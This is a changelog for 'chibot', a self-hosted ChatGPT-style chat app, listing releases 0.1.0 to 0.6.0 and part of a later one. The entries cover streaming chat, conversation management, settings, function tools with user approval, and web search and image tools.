- Tools get a `ToolContext` (chat id, stop signal) and a `label`; `defaultTools()` builds the ones whose setup exists.
- End-to-end tests for search and sources, reading a page and refusing a local one, creating and editing an image, the composer menu and switching a tool off. The fake server fakes Brave and the images API and serves a test page.

### Changed

- `Config` validates the environment with zod, naming the variable in each error.
- Tool activity has friendlier labels ("Searched the web", "Created an image").
- Roadmap: Phase 6 detailed. Tools are used automatically, forced from a composer "+" menu and switched off in Settings (instead of per-chat toggles); `edit_image` joins `generate_image`, without streamed partial images; `fetch_url` guards addresses in an undici connector; generated images get `files.conversation_id` now.

## [0.6.0] - 2026-10-23

### Added

- Function tools: the model can call chibot's own tools mid-answer (`Tool` subclasses in a `ToolRegistry`). Calls run in order, their outputs are saved in the history and streamed as `chibot.tool_output`, and the model is asked again, up to 10 requests per answer. Tool errors and invalid arguments go back to the model instead of ending the turn, and a stopped answer still records an output for every call.
- Approval: a tool with `requiresApproval` ends the turn with `chibot.approval`; `POST /turns` with `{ approvals }` runs or denies the waiting calls and continues the answer. Sending a new message instead denies them. Waiting approvals survive a reload.
- Calculator tool (mathjs, exact BigNumber arithmetic, functions and unit conversions; expressions can't reach the parser itself).
- The instructions tell the model the current date, time and timezone.
- Answers show each tool call ("Running …", then a collapsed "Used …" with arguments and result), and an approval card with Approve / Deny. Markdown exports quote tool calls with their results.
- End-to-end tests for the calculator and for approving, denying and implicitly denying a tool, through a test-only tool that needs approval.

### Changed

- An answer's token count now sums all its responses (one per tool round).
- Roadmap: phases reordered to tools (5), web search & image generation (6), memory (7), projects (8), then attachments & voice input (9). Generated images now introduce file storage (`FileStore`, `GET /api/files/:id`) and project files introduce `POST /api/files`, which attachments build on; `Config` moves to zod with the image endpoint in Phase 6.
- Roadmap: the current date goes into the instructions (Phase 5), a `fetch_url` tool joins web search (Phase 6) and a `search_chats` tool joins memory (Phase 7). A sandboxed code runner and an MCP client are noted as future tools.

## [0.5.0] - 2026-10-22

### Added

- Settings stored in SQLite with `GET`/`PATCH /api/settings` (validated with zod; secrets are never included). The chat model is now a setting that defaults to `OPENAI_MODEL`.
- Model picker in the header: searches the server's model list (`GET /api/models`), or takes a typed name when the server can't list models. The choice applies to new turns, edits and regenerations, and each answer shows the model that wrote it.
- Reasoning: chat requests ask for a reasoning summary, plus the effort when set (the `reasoningEffort` setting). A collapsible "Thinking…" shows the summary while the model thinks, and answers keep it as "Thoughts". Models that reject reasoning parameters are retried without them, and remembered.
- Custom instructions (`aboutUser`, `responseStyle` settings) are sent as `instructions` with every chat turn (not titles), after a built-in line asking for `$…$` / `$$…$$` math so formulas render.
- Long chats: requests ask the server to compact the context past `compactThreshold` tokens (default 64,000; `null` turns it off). Compaction items are kept in the history, a turn's input starts at the last one, and the chat shows "Earlier messages were summarized to save context" where it happened. Servers that reject the option are retried without it.
- Export a chat from its menu as Markdown (what's shown) or JSON (the whole tree: every version, usage and models; `{ version: 1 }`). `POST /api/conversations/import` adds an exported JSON chat back, validated, with new ids and the same version shown (up to 20 MB).
- End-to-end tests for the model picker, reasoning effort and custom instructions, thinking, theme, export/import and compaction. The fake server gained a model list, reasoning and compaction output, and `/debug/last-request`.
- Settings dialog (sidebar gear or ⌘/Ctrl+,): theme (System / Light / Dark), custom instructions, reasoning effort, compaction on/off and threshold, importing a chat, and archived chats (moved here from the sidebar).

### Changed

- Colours are defined once with `light-dark()` and follow `color-scheme`, so a theme setting can override the system (applied before first paint via `<meta name="color-scheme">`). Code highlighting uses chibot's own GitHub-style tokens instead of highlight.js's media-query theme files.

## [0.4.0] - 2026-10-22

### Added

- Edit a sent message (inline, Enter to send, Esc to cancel) and regenerate an answer, each creating a new version. `< 2/3 >` switches between versions, and each version keeps its own follow-up messages. A failed answer shows Retry.
- Token usage: each answer shows its token count, and the header shows the chat's total across all versions. Hover either for input (cached) and output (reasoning) tokens.
- Keyboard shortcuts (ChatGPT's core set): new chat ⌘/Ctrl+⇧+O, search ⌘/Ctrl+K, toggle sidebar ⌘/Ctrl+⇧+S, focus the message box ⇧+Esc, copy the last answer ⌘/Ctrl+⇧+C, stop Esc, and ⌘/Ctrl+/ (or the sidebar's Keyboard shortcuts) for the list.
- Copy buttons on messages, answers and code blocks. Code blocks get a header with the language and Copy code.
- End-to-end tests (`pnpm test:e2e`, Playwright) against a fake OpenAI-compatible server: chat, titles, usage and copy; edit and regenerate versions with their own follow-ups; switching chats mid-answer; revisiting a just-created chat; keyboard shortcuts.
- API: `POST /api/conversations/:id/turns` accepts `parentId` (edit or regenerate), `PUT /api/conversations/:id/leaf` switches versions, and `GET /api/conversations/:id` reports each item's `siblingIds` and the chat's token totals.

### Fixed

- Starting chibot from another folder ignored its `.env` (it was read from the current folder only), so it failed with "OPENAI_API_KEY is not set". It now reads the real environment, then `.env` in the current folder, then the chibot folder's `.env`.

## [0.3.1] - 2026-10-22

### Changed

- `POST /api/conversations` now answers malformed JSON with a 400 instead of ignoring it. An empty body still creates a normal chat.

### Fixed

- Switching to another chat while an answer was streaming kept writing the old answer into the new chat and, once done, showed the old conversation under the new chat's URL. Leaving a chat mid-answer now stops it (the partial answer is kept), as closing the tab does.
- Returning to a chat you had just started (via New chat, then the sidebar) showed an empty view.
- While an answer streamed, the chat kept jumping to the bottom, so you couldn't scroll up to read. It now follows the answer only while you're at the bottom.
- Renaming, pinning, archiving, restoring or deleting a chat failed silently. Errors now show in the sidebar or the Archived chats dialog, and the list resyncs.
- Links in answers opened in the same tab, leaving chibot (and stopping an answer in progress). They now open in a new tab; footnote links stay on the page.

## [0.3.0] - 2026-10-22

### Added

- Phase 2 conversations sidebar: Pinned and date groups, inline rename, pin, archive and delete (with confirmation) from a per-chat menu, and collapse to an icon rail that's remembered.
- Search chats: a dialog that searches titles and message text (SQLite FTS5, word prefixes) and shows matching snippets.
- Archived chats dialog to restore or delete archived conversations.
- Temporary chat: a toggle on a new chat. It's never listed, titled or indexed, and is deleted when you leave it. The server also sweeps leftovers at startup.
- Automatic titles: after the first answer the chat model writes a 3-6 word title, which streams to the sidebar as a `chibot.title` event.
- API: `GET /api/conversations` (`archived=1`, `q=`), `PATCH` and `DELETE /api/conversations/:id`, and `POST /api/conversations` with `{ temporary: true }`.
- `DESIGN.md`: ChatGPT-inspired design guide with measured tokens, layout and component specs for current and upcoming UI.

### Changed

- UI restyled to the design guide: centred empty state that docks the composer after the first message, pill composer with icon send/stop buttons (`lucide-react`), ChatGPT-like palette and type scale in both themes, and a disclaimer under the composer.
- Chat window matches ChatGPT's measured styles: blue user bubbles (22 px radius), a blue send button, 16/26 px answers, code blocks without a box under a language label, and SF Mono inline-code chips.

## [0.2.0] - 2026-10-22

### Added

- Phase 1 minimal chatbot: streamed answers rendered as Markdown (GFM tables, syntax-highlighted code, KaTeX math), Enter to send, Shift+Enter for a newline, and a Stop button.
- Stateless chat (`store: false`, encrypted reasoning replayed) with history kept as a tree of SDK items in SQLite (`node:sqlite`) under `CHIBOT_DATA_DIR`.
- A stopped answer or a mid-answer disconnect keeps the partial text.
- `/c/:id` URLs: a reload reopens the chat, and the production server serves client routes.
- Errors from the model server are shown with their HTTP status and request id.
- API: `POST /api/conversations`, `GET /api/conversations/:id`, `POST /api/conversations/:id/turns` (SSE of the SDK's `ResponseStreamEvent`s plus `chibot.error`).
- OpenAI-compatible providers: `OPENAI_BASE_URL` points chat at any Responses API server (e.g. Ollama, LM Studio). `OPENAI_API_KEY` becomes optional there, and `OPENAI_MODEL` becomes required. `GET /api/health` reports the base URL.
- `HOST` setting. The server and the Vite dev server now listen on `127.0.0.1` by default, and the server warns when `HOST` exposes it beyond this machine.

### Changed

- Roadmap: browser disconnects are handled like Stop; LaTeX math rendering and `/c/:id` URLs move into Phase 1.
- Roadmap: React Router for routing; titles come from the chat model (the separate title model is dropped); Phase 2 adds date grouping, FTS5 search, pin and archive; Phase 5 keeps a local copy of each attachment and re-uploads it if OpenAI no longer has it.
- Roadmap: `CHIBOT_DATA_DIR` (default `<repo>/data`) replaces `CHIBOT_DB_PATH`; Phase 7 adds per-tool approval and ships a calculator sample tool; no git remote or CI.
- Roadmap: temporary chat (Phase 2), keyboard shortcuts (Phase 3), theme toggle (Phase 4), voice input (Phase 5), project instructions and default model/settings (Phase 8), and a new Phase 9 for memory.
- Roadmap: no OpenAI-hosted tools. Custom function tools move to Phase 6. Phase 7 rebuilds web search (Brave Search API) and image generation (`images.generate`) as our own tools. Phase 8 project files use local RAG (embeddings + `sqlite-vec`) instead of `file_search`.
- Roadmap: one Responses-API chat provider at a time; transcription, image and embedding endpoints can each be overridden; attachments fall back to inline base64 where there's no Files API.
- Workflow: small commits per step, a release commit per phase, and a review stop after each phase. Compatibility is checked against Ollama with `gemma4:cloud`.
- Roadmap revised after review: history is stored as a tree from Phase 1 to support ChatGPT-style message versions; the old Phase 3 is split into "Edit & versions" (with token usage) and "Models & settings" (with export/import); Phase 8 projects is kept. Styling is plain CSS, and Playwright tests start in Phase 3.

## [0.1.0] - 2026-10-22

### Added

- Phase 0 foundations: `Config` (env validation), Hono server with `GET /api/health`, and a React + Vite web shell. `pnpm dev` runs both servers with an `/api` proxy, and `pnpm build && pnpm start` serves the built app from the API server.
- `README.md` with setup and usage, plus `.env.example`.
- `PLAN.md` (product requirements and phased roadmap), `AGENTS.md` (developer guide, imported by `CLAUDE.md`) and this changelog.
